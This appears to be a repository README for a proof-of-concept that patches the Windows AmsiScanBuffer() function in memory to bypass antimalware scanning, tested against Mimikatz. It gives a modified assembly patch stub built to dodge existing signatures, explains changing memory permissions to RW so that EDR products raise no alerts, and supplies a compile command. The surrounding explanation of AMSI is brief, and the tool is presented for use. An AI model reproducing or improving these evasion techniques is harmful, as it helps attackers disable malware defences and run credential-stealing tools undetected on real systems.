# AMSI Patching for dummies

![](https://www.siliconera.com/wp-content/uploads/2022/11/FiDpzbCaYAINoN_.jpg)

This repository contains a PoC to [@RastaMouse's AMSI Patching Techniques](https://rastamouse.me/memory-patching-amsi-bypass/), along with some minor improvements and incorporates some new techniques into it as well to avoid EDRs from flagging it.

The code essentially scans a buffer (for our use case, we use unobfuscated Mimikatz), and passes it to AMSI to determine if it is sus. Then it proceeds to patch the `AmsiScanBuffer()` function and scans the same file again to check if the patching works!

# Hat-tip

This repository takes direct inspiration from [Rasta Mouse's Blog](https://rastamouse.me/memory-patching-amsi-bypass/). We would be using the techniques used in the blog and try to improve upon it whenever and wherever we can. 

# AMSI, what is it? 
ChatGPT describes AMSI as: 

> Anti-Malware Scan Interface (AMSI) is a way for computers running Microsoft Windows to scan files and other data for viruses and other types of malware. When a program wants to scan some data, it can use AMSI to ask the computer's antivirus software to check the data for malware. This helps to protect the computer from viruses and other malicious software that might try to hide in the data. AMSI is especially useful for programs that handle user input, such as text editors, web browsers, and productivity software, because it can scan the data before it is displayed or executed. This helps to prevent the user from accidentally running or viewing malware.

According to the [official Microsoft Documentation on AMSI](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal), it is:

> A versatile interface standard that allows your applications and services to integrate with any antimalware product that's present on a machine. AMSI provides enhanced malware protection for your end-users and their data, applications, and workloads.

![](https://i0.wp.com/docs.microsoft.com/en-us/windows/win32/amsi/images/amsi7archi.jpg)

Long story short, AMSI is a interface/feature that is used to identify malicious buffers and strings. It is an intermediate between an application and AV engines.

# Patching AMSI

We would be using [@RastaMouse's AMSI Patching Techniques](https://rastamouse.me/memory-patching-amsi-bypass/) with some improvements. There are two changes we have made:

- **Change the Payload**: In his PoC, RastaMouses uses the following payload(for x64 machines):
  ```asm
  mov eax, 0x80070057 
  ret
  ```
  This might be too well signatured at this point, so alternatively we use:

  ```asm
  xor eax, eax
  mov eax, 0x11111111
  xor eax, 0x91161146
  ret
  ```
  This essentially does the same job but might help with signatures.

- **Change Memory Permissions**: During the first call to `VirtualProtect()`, @RastaMouse changes the memory region's permission to RWX which EDRs throw all kinds of red flags for, so instead, we would be only using RW permissions!

# Compilation

Compiling the project is as easy as:
```bash
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc.\src\patch_amsi.c /link /OUT:patcher.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
```
